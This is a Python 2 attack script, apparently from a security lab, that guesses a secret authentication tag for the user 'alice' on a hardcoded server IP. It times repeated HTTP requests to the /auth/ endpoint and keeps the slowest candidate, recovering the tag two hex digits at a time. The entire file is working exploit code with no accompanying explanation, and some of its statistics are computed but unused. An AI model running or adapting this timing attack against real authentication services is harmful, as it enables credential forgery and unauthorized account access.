import urllib2
import string
import time
from requests.exceptions import HTTPError
import timeit
import requests
import constant
from math import sqrt


def toHex(tag):
	temp = []
	for item in tag:
		temp.append(hex(item)[2:])
	str1 = ''.join(temp)
	#print temp
	#print str1
	return str1

def getStdDev(timeArray):
	partSum = 0
	mean = sum(timeArray)/constant.NO_OF_TESTS
	for item in timeArray:
		partSum = partSum + ((item - mean) ** 2)
		#print partSum
	#print "partSum: " + str(partSum)
	stddev = float(sqrt((0.1 * partSum)))
	#print "stddev: " + str(stddev)
	return stddev

def sampleTime(tag, timeout):
	print "in sampleTime"
	timeArray = [0] * constant.NO_OF_TESTS
	for x in range (constant.NO_OF_TESTS):
		try:
			timeArray[x] = requests.get("http://130.243.27.198/auth/" + str(timeout) + "/" + username + "/" + toHex(tag)).elapsed.total_seconds()
		except:
			print "ERROR"
	#print timeArray
	print min(timeArray)
	return min(timeArray), getStdDev(timeArray)
	
def increaseTag(tag, pos):
	finished = 0
	tag[pos + 1] += 1
	if tag[pos + 1] > 15:
		tag[pos] += 1
		tag[pos + 1] = 0
	if tag[pos] > 15:
		finished = 1
	return tag, finished


def tryTag(tag, pos, meanTime, timeConst, stdDev):
	timeArray = [0] * constant.NO_OF_TESTS
	longest = [0.0] * 3
	while pos <= 30: #Could be <= 30?
		for x in range (constant.NO_OF_TESTS):
			timeArray[x] = requests.get("http://130.243.27.198/auth/"+ str(timeout) + "/" + username + "/" + toHex(tag)).elapsed.total_seconds()
		connectionTime = min(timeArray)
		if connectionTime > longest[0]:
			longest[0] = connectionTime
			longest[1] = tag[pos]
			longest[2] = tag[pos + 1]
			print "Best candidate: Time: " + str(longest[0]) + " | " + str(longest[1]) + str(longest[2])
		print "meanTime: " + str(meanTime)
		print "connectionTime: " + str(connectionTime)
		tag, finished = increaseTag(tag, pos)
		if finished == 1:
			pos += 2
		print tag
	return tag



timeout = 1 #The timeout in ms the server will wait after each byte-byte comparison
timeConst = ((float(timeout)/1000))-(float(timeout)/10000) #How much the waiting time will increase after each found byte-pair. With a safety marginal
print "timeconst: " + str(timeConst)
username = 'alice' #The username we know (or believe) to exist on the server
currentTag = [0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0] #Create a tag containing all 0
meanTime, stdDev = sampleTime(currentTag, timeout) #Calculate mean time for server parsing on currentTag
currentTag = tryTag(currentTag, 0, meanTime, timeConst, stdDev) #Find the correct tag!
print currentTag

try:
	contents = urllib2.urlopen("http://130.243.27.198/auth/" + str(timeout) + "/" + username + "/" + toHex(currentTag)).read()
	print contents
except urllib2.HTTPError as error:
	if error.code == 404:
		print 'We got a 404'
		print error
	else:
		print error
